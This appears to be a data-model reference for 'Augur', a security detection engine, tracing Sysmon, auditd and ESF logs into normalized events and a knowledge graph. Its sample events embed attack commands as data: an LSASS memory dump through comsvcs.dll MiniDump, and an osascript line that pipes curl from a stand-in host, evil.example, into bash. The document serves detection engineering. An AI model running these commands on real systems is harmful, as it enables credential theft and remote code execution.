**English** | [Tiếng Việt](../vi/DATA_MODEL.md)

# Augur — Data Model Reference

This document traces a security event from raw log line through every transformation: OS-specific
raw event → canonical `NormalizedEvent` → knowledge-graph nodes and edges → topology enrichment.
See [ENGINE.md](ENGINE.md) for how the engine consumes the graph, and
[SCENARIO_FORMAT.md](SCENARIO_FORMAT.md) for how scenarios describe what to look for.

---

## 1. Raw Log Sources

Augur ingests JSONL files — one JSON object per line — via `augur.ingest.read_jsonl(path)`. The
`source_type` field on each event selects the normalizer. When `source_type` is absent, the legacy
Windows path is used (equivalent to `windows_sysmon`).

### 1.1 `windows_sysmon`

Five `event_id` values are accepted; all others raise `ValueError`.

| `event_id` | Mapped `kind` | Meaning |
|---|---|---|
| `1` (int) | `process_create` | New process spawned |
| `7` (int) | `image_load` | DLL loaded into a process |
| `22` (int) | `dns_query` | Sysmon DnsQuery (native) — see §1.4 |
| `3` (int) | `network_connect` | Sysmon NetworkConnect (native) — see §1.4 |
| `"edr"` (str) | `behavior` | EDR behavioral marker |

**Sample raw event — process create (event_id 1):**

```json
{
  "source_type": "windows_sysmon",
  "event_id": 1,
  "timestamp": "2026-03-14T08:22:01.000000+00:00",
  "host": "HR_User_PC",
  "user": "CORP\\jsmith",
  "user_sid": "S-1-5-21-1234-5678-9012-1001",
  "process_guid": "{aabbcc-0001}",
  "process_name": "rundll32.exe",
  "process_path": "C:\\Windows\\System32\\rundll32.exe",
  "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Temp\\lsass.dmp full",
  "parent_process_guid": "{aabbcc-0000}",
  "parent_process_name": "cmd.exe",
  "integrity_level": "High",
  "hashes": { "MD5": "d1e4a42b3c1f9aa2c4e7b5dd12345678" },
  "signed": true,
  "signature_vendor": "Microsoft Corporation"
}
```

**Resulting `NormalizedEvent`:**

```
kind              = "process_create"
host              = "HR_User_PC"
event_id          = 1
user              = "CORP\\jsmith"
user_sid          = "S-1-5-21-1234-5678-9012-1001"
process_guid      = "{aabbcc-0001}"
process_name      = "rundll32.exe"
process_path      = "C:\\Windows\\System32\\rundll32.exe"
command_line      = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 ..."
parent_process_guid = "{aabbcc-0000}"
parent_process_name = "cmd.exe"
integrity_level   = "High"
hashes            = {"MD5": "d1e4a42b..."}
signed            = true
signature_vendor  = "Microsoft Corporation"
source_type       = "windows_sysmon"
os_family         = "windows"
raw_event_type    = "1"
```

### 1.2 `linux_auditd`

Three auditd record types are consumed (`EXECVE`, `SYSCALL`, `EDR`); any other `type` value causes
the event to be silently dropped (the normalizer returns `None`). A stable `process_guid` is
synthesised as `"host:pid"` to link records for the same process across the graph.

| `type` | Discriminator | Mapped `kind` | Meaning |
|---|---|---|---|
| `EXECVE` | — | `process_create` | Process execution (auditd canonical form) |
| `SYSCALL` | `syscall == "connect"` | `network_connect` | `connect(2)` capture, decoded `daddr`/`dport` (native) — see §1.4 |
| `SYSCALL` | `name` present | `image_load` | Shared-object mapped (`.so` load) |
| `EDR` | `behavior == "dns_query"` | `dns_query` | Agent/EDR DNS overlay (auditd does NOT resolve DNS) — see §1.4 |
| `EDR` | otherwise | `behavior` | Behavioral marker from Linux agent |

Command-line reconstruction priority for EXECVE records:

1. Positional args `a0`…`aN` joined with spaces (canonical auditd EXECVE form)
2. `proctitle` with NUL bytes replaced by spaces
3. `cmdline` overlay field (some EDR agents emit this)
4. `comm` basename (last resort)

**Sample raw event — EXECVE:**

```json
{
  "source_type": "linux_auditd",
  "type": "EXECVE",
  "timestamp": "2026-03-14T08:22:05.000000+00:00",
  "host": "lnx-worker-01",
  "uid": "1000",
  "auid": "1000",
  "pid": 4821,
  "ppid": 4800,
  "comm": "crontab",
  "exe": "/usr/bin/crontab",
  "a0": "crontab",
  "a1": "-e"
}
```

**Resulting `NormalizedEvent`:**

```
kind              = "process_create"
host              = "lnx-worker-01"
event_id          = "EXECVE"
user              = "1000"
user_sid          = "1000"
process_guid      = "lnx-worker-01:4821"
process_name      = "crontab"
process_path      = "/usr/bin/crontab"
command_line      = "crontab -e"
parent_process_guid = "lnx-worker-01:4800"
source_type       = "linux_auditd"
os_family         = "linux"
raw_event_type    = "EXECVE"
```

> **Note on pid reuse:** The `host:pid` guid scheme can collide over very long runs. It is a
> documented PoC limitation; acceptable for bounded simulator windows and hand-written fixtures.

### 1.3 `macos_esf`

The macOS Endpoint Security Framework emits nested JSON. Four `event_type` values are consumed;
others are dropped.

| `event_type` | Mapped `kind` | Meaning |
|---|---|---|
| `ES_EVENT_TYPE_NOTIFY_EXEC` | `process_create` | Process execution via ESF |
| `ES_EVENT_TYPE_NOTIFY_MMAP` | `image_load` | Memory-mapped file (dylib or framework) |
| `ES_AGENT_NOTIFY_NETWORK_CONNECT` | `network_connect` | Agent/Network-Extension overlay (stable ESF has no socket-connect NOTIFY) — see §1.4 |
| `ES_AGENT_NOTIFY_DNS_QUERY` | `dns_query` | Agent/NEDNSProxyProvider overlay (DNS is not in raw ESF) — see §1.4 |

For exec events:
- `process_guid` = `process.audit_token` (stable across forks; preferred over `host:pid`)
- `parent_process_guid` = `process.parent_audit_token` if present, else `"host:ppid"`
- `signed` ← `process.is_platform_binary`
- `signature_vendor` ← `process.signing_id`
- `command_line` from `event.exec.args` (list or pre-joined string both accepted)

For mmap events the mapped-file path is read from `event.mmap.source.path` or
`event.mmap.file.path` (both accepted for compatibility).

**Sample raw event — ES_EVENT_TYPE_NOTIFY_EXEC:**

```json
{
  "source_type": "macos_esf",
  "event_type": "ES_EVENT_TYPE_NOTIFY_EXEC",
  "timestamp": "2026-03-14T09:10:00.000000+00:00",
  "host": "mac-eng-02",
  "user": "dev",
  "process": {
    "executable": { "path": "/usr/bin/osascript" },
    "audit_token": "mac-eng-02:8800",
    "ppid": 1,
    "parent_audit_token": "mac-eng-02:1",
    "is_platform_binary": true,
    "signing_id": "com.apple.osascript"
  },
  "event": {
    "exec": {
      "args": ["osascript", "-e", "do shell script \"curl -sS http://evil.example/stage2 | bash\""]
    }
  }
}
```

**Resulting `NormalizedEvent`:**

```
kind              = "process_create"
host              = "mac-eng-02"
event_id          = "ES_EVENT_TYPE_NOTIFY_EXEC"
user              = "dev"
process_guid      = "mac-eng-02:8800"
process_name      = "osascript"
process_path      = "/usr/bin/osascript"
command_line      = "osascript -e do shell script ..."
parent_process_guid = "mac-eng-02:1"
signed            = true
signature_vendor  = "com.apple.osascript"
source_type       = "macos_esf"
os_family         = "macos"
raw_event_type    = "ES_EVENT_TYPE_NOTIFY_EXEC"
```

### 1.4 Network-telemetry kinds: `dns_query` and `network_connect`

Two event kinds beyond the original `process_create` / `image_load` / `behavior` set carry
network telemetry for the threat-intel overlay. They populate three otherwise-empty fields on
`NormalizedEvent`:

- `dns_query` → `domain` (the queried name, read from the raw `query_name`)
- `network_connect` → `dest_ip` (the matchable IOC value) and `dest_port` (context only)

**Per-OS provenance (honest about what each source genuinely carries):**

| OS | `dns_query` source | `network_connect` source |
|---|---|---|
| Windows | Sysmon EID 22 (DnsQuery) — **native** | Sysmon EID 3 (NetworkConnect) — **native** |
| Linux | `EDR` record with `behavior == "dns_query"` — **agent/EDR overlay** (auditd does NOT resolve DNS) | `SYSCALL` `connect(2)`, decoded `daddr`/`dport` — **native**, the most native of the four new paths |
| macOS | `ES_AGENT_NOTIFY_DNS_QUERY` — **agent overlay** (stable ESF has no DNS NOTIFY) | `ES_AGENT_NOTIFY_NETWORK_CONNECT` — **agent overlay** (stable ESF has no socket-connect NOTIFY) |

> **Inert / engine-blind / IOC-overlay-only.** These two kinds and their three fields
> (`domain`, `dest_ip`, `dest_port`) are completely invisible to the detection engine:
>
> - `build_graph` (`src/augur/graph/builder.py`) is a closed `if/elif` over
>   `process_create` / `image_load` / `behavior`. A `dns_query` or `network_connect` event
>   produces **zero** graph nodes and edges, so the matcher never enumerates it.
> - `domain`, `dest_ip`, and `dest_port` appear in **no** criteria field map
>   (`PROCESS_KEY_MAP` / `FILE_KEY_MAP` in `src/augur/engine/criteria.py`), so no scenario step
>   can ever reference them. (Note: `hashes` is likewise absent from those maps — it is copied
>   onto `ProcessNode` but never matched against.)
>
> Adding these kinds/fields therefore changed **zero** engine behavior — confirmed by
> graph-equality guard tests, and by detectability holding at 40/40 and robustness at 100%.
> They exist solely to feed the read-only IOC threat-intel overlay (`POST /api/ioc_match`),
> which is the only consumer that reads them.

**Sample raw events (Windows Sysmon, native):**

```json
{"source_type": "windows_sysmon", "event_id": 22, "timestamp": "2026-03-14T08:23:00.000000+00:00",
 "host": "HR_User_PC", "process_guid": "{aabbcc-0001}", "query_name": "evil.example.com"}
{"source_type": "windows_sysmon", "event_id": 3, "timestamp": "2026-03-14T08:23:01.000000+00:00",
 "host": "HR_User_PC", "process_guid": "{aabbcc-0001}", "dest_ip": "203.0.113.7", "dest_port": 443}
```

**Resulting `NormalizedEvent`s:**

```
kind = "dns_query"        host = "HR_User_PC"  process_guid = "{aabbcc-0001}"  domain = "evil.example.com"
kind = "network_connect"  host = "HR_User_PC"  process_guid = "{aabbcc-0001}"  dest_ip = "203.0.113.7"  dest_port = 443
```

---

## 2. Canonical `NormalizedEvent`

Every normalizer produces a single `NormalizedEvent` dataclass (`src/augur/normalize/model.py`).
The graph builder, engine, and scorer all operate exclusively on this type.

### 2.1 Complete Field Reference

| Field | Type | Present for | Description |
|---|---|---|---|
| `timestamp` | `datetime` (tz-aware) | all | Event time, parsed via `datetime.fromisoformat()` |
| `kind` | `str` | all | `"process_create"` / `"image_load"` / `"behavior"` / `"dns_query"` / `"network_connect"` (last two are inert — see §1.4) |
| `host` | `str` | all | Hostname used as the graph key and topology lookup key |
| `event_id` | `int \| str` | all | Source event identifier (`1`, `7`, `"EXECVE"`, …) |
| `user` | `str \| None` | process events | Username or UID string |
| `process_guid` | `str \| None` | process / image / behavior | Stable per-process identifier |
| `process_name` | `str \| None` | process events | Executable basename |
| `process_path` | `str \| None` | process events | Full path to the executable |
| `command_line` | `str \| None` | process events | Full argument string |
| `parent_process_guid` | `str \| None` | process events | Parent's stable identifier |
| `parent_process_name` | `str \| None` | process events | Parent executable basename |
| `integrity_level` | `str \| None` | Windows process events | e.g. `"High"`, `"Medium"` |
| `user_sid` | `str \| None` | Windows / Linux | SID (Windows) or AUID string (Linux) |
| `hashes` | `dict` | Windows process events | `{"MD5": "…", "SHA256": "…"}` — empty dict default |
| `image_loaded` | `str \| None` | `image_load` | Full path of the loaded file |
| `extension` | `str \| None` | `image_load` | Lowercase extension with dot, e.g. `".dll"` |
| `signed` | `bool \| None` | `image_load` | Whether the file is signed |
| `signature_vendor` | `str \| None` | `image_load` | Signing certificate subject or signing ID |
| `is_injected` | `bool` | `image_load` | Agent flagged this as an injected module; default `False` |
| `api_hooking_detected` | `bool` | `image_load` | Agent detected API hooking; default `False` |
| `hooked_functions` | `list` | `image_load` | Names of hooked API functions; default `[]` |
| `behavior` | `str \| None` | `behavior` | Behavior marker string, e.g. `"lsass_access"` |
| `target` | `str \| None` | `behavior` | Target process or object name |
| `granted_access` | `str \| None` | `behavior` | Access mask hex string, e.g. `"0x1410"` |
| `reason` | `str \| None` | `behavior` | Free-text reason supplied by the agent |
| `domain` | `str \| None` | `dns_query` | Queried domain name; **inert** — in no field map (see §1.4) |
| `dest_ip` | `str \| None` | `network_connect` | Destination IP — the matchable IOC value; **inert** (see §1.4) |
| `dest_port` | `int \| None` | `network_connect` | Destination port — context only, NOT a matchable IOC; **inert** (see §1.4) |
| `source_type` | `str \| None` | all (provenance) | `"windows_sysmon"` / `"linux_auditd"` / `"macos_esf"` |
| `os_family` | `str \| None` | all (provenance) | `"windows"` / `"linux"` / `"macos"` — set by normalizer |
| `raw_event_type` | `str \| None` | all (provenance) | String form of the original event type identifier |

Provenance fields (`source_type`, `os_family`, `raw_event_type`) are stored for observability only.
The matcher and scorer never read them. The network-telemetry fields (`domain`, `dest_ip`,
`dest_port`) are likewise inert — they exist only for the IOC overlay (see §1.4).

---

## 3. Knowledge Graph

`build_graph(events, topology, backend)` (`src/augur/graph/builder.py`) converts `NormalizedEvent`
objects into a typed directed multigraph of nodes and edges. The graph backend is selected by
`augur.pipeline._select_backend()`: `NetworkXBackend` by default (infra-free); `Neo4jBackend` when
`AUGUR_BACKEND=neo4j` is set.

The builder is a closed `if/elif` over `process_create` / `image_load` / `behavior` only.
`dns_query` and `network_connect` events fall through it and create **no** nodes or edges (see §1.4).

### 3.1 Node Types

All node types are plain Python `@dataclass` objects — not Pydantic models.

#### `HostNode`

Created once per unique hostname, populated from the topology.

| Field | Type | Notes |
|---|---|---|
| `id` | `str` | Equal to `hostname` |
| `hostname` | `str` | Canonical hostname |
| `ip` | `str` | IP address from topology |
| `os` | `str` | OS label from topology |
| `zone` | `Zone` | Authoritative zone (see §4) |
| `criticality` | `Criticality` | Authoritative criticality (see §4) |
| `node_type` | `str` | Always `"Host"` |

#### `ProcessNode`

Created from `process_create` events.

| Field | Type | Notes |
|---|---|---|
| `id` | `str` | `process_guid` |
| `name` | `str \| None` | `process_name` |
| `path` | `str \| None` | `process_path` |
| `command_line` | `str \| None` | Full argument string |
| `parent_guid` | `str \| None` | `parent_process_guid` |
| `parent_process_name` | `str \| None` | Parent executable basename |
| `host` | `str` | Source event hostname |
| `timestamp` | `datetime \| None` | Event time |
| `user_sid` | `str \| None` | SID or AUID |
| `integrity_level` | `str \| None` | Windows integrity level |
| `hashes` | `dict` | Cryptographic hashes |
| `node_type` | `str` | Always `"Process"` |

#### `FileNode`

Created from `image_load` events.

| Field | Type | Notes |
|---|---|---|
| `id` | `str` | `process_guid` of the loading process |
| `name` | `str \| None` | Basename of `image_loaded` |
| `path` | `str \| None` | `image_loaded` full path |
| `extension` | `str \| None` | Lowercased extension (`.dll`, `.so`, `.dylib`) |
| `is_signed` | `bool \| None` | `signed` field |
| `is_injected` | `bool` | `is_injected` |
| `api_hooking_detected` | `bool` | `api_hooking_detected` |
| `host` | `str` | Hostname of the loading process |
| `timestamp` | `datetime \| None` | Event time |
| `signature_vendor` | `str \| None` | Signing identity |
| `hooked_functions` | `list` | Names of hooked API functions |
| `node_type` | `str` | Always `"File"` |

### 3.2 Edge Types

Every `Edge` carries `src_id`, `dst_id`, `edge_type`, `timestamp`, and a free-form `attrs` dict.

| `edge_type` | Source → Destination | Triggered by | `attrs` content |
|---|---|---|---|
| `SPAWNED` | `ProcessNode` → `ProcessNode` | `process_create` | Links parent guid to child guid |
| `LOADED` | `ProcessNode` → `FileNode` | `image_load` | Links loading process to the file node |
| `EXHIBITED` | `ProcessNode` → `ProcessNode` | `behavior` | Source process to target process; carries `behavior`, `target`, `granted_access` |
| `RUNS_ON` | `ProcessNode` → `HostNode` | Every process node | Anchors the process to its host for scope checks |

---

## 4. Topology

`load_topology()` reads `topology/network.yaml` and exposes `Topology.enrich(hostname)` which
returns `(Zone, Criticality)`. This is the **sole authoritative source** for zone and criticality.
Any `zone` field on a raw log event is completely ignored during constraint evaluation.

Hosts absent from the topology file receive `Zone.Unknown` and `Criticality.UNKNOWN`, which fail
all spatial constraint gates. Their events enter the graph but never contribute to a proximity score.

### 4.1 Zone Values

| Enum member | Serialized string | Typical use |
|---|---|---|
| `Zone.DMZ` | `"DMZ"` | Internet-facing perimeter hosts |
| `Zone.Internal_Server` | `"Internal_Server"` | Backend / application servers |
| `Zone.User_Endpoint` | `"User_Endpoint"` | Employee workstations and laptops |
| `Zone.Cloud_SaaS` | `"Cloud_SaaS"` | Cloud-hosted workloads |
| `Zone.Active_Directory` | `"Active_Directory"` | Domain controllers and AD-adjacent hosts |
| `Zone.Unknown` | `"Unknown"` | Hosts not in the topology; fails all spatial gates |

### 4.2 Criticality Values

| Enum member | Serialized string |
|---|---|
| `Criticality.LOW` | `"LOW"` |
| `Criticality.MEDIUM` | `"MEDIUM"` |
| `Criticality.HIGH` | `"HIGH"` |
| `Criticality.CRITICAL` | `"CRITICAL"` |
| `Criticality.UNKNOWN` | `"UNKNOWN"` |

### 4.3 LinkScope Values

Used in scenario step `temporal_link` to constrain host relationships between consecutive steps.

| Enum member | Serialized string | Constraint |
|---|---|---|
| `LinkScope.same_host` | `"same_host"` | Both steps must involve the same hostname |
| `LinkScope.cross_host` | `"cross_host"` | Steps must involve different hostnames |
| `LinkScope.any` | `"any"` | No host-relationship constraint applied |

---

## 5. Detection Output

After the engine runs, each matched scenario produces a `Detection` dataclass
(`src/augur/engine/scoring.py`). The REST API strips any field whose name starts with `_`
via `_public()`.

Key public fields returned by `/api/detections`:

| Field | Type | Description |
|---|---|---|
| `scenario_id` | `str` | e.g. `"SCEN-WIN-001"` |
| `scenario_name` | `str` | Human-readable name |
| `severity` | `str` | `"LOW"` / `"MEDIUM"` / `"HIGH"` / `"CRITICAL"` |
| `proximity` | `float` | `round(matched_steps / total_steps, 4)` |
| `matched_steps` | `int` | Contiguous prefix steps matched |
| `total_steps` | `int` | Total steps in the scenario |
| `affected_hosts` | `list[str]` | Hostnames involved in the matched chain |
| `chain` | `list` | Ordered list of matched graph nodes |

Internal-only private fields (used for ranking, never sent to clients): `_latest_ts`,
`_latest_ts_epoch`, `_severity_rank`. Detection ranking order:
`(-proximity, -severity_rank, -latest_ts_epoch)`.

---

## See Also

- [ENGINE.md](ENGINE.md) — longest-valid-prefix matching algorithm
- [SCENARIO_FORMAT.md](SCENARIO_FORMAT.md) — scenario YAML authoring reference
- [API.md](API.md) — REST endpoint reference
- [ARCHITECTURE.md](ARCHITECTURE.md) — full pipeline and component overview
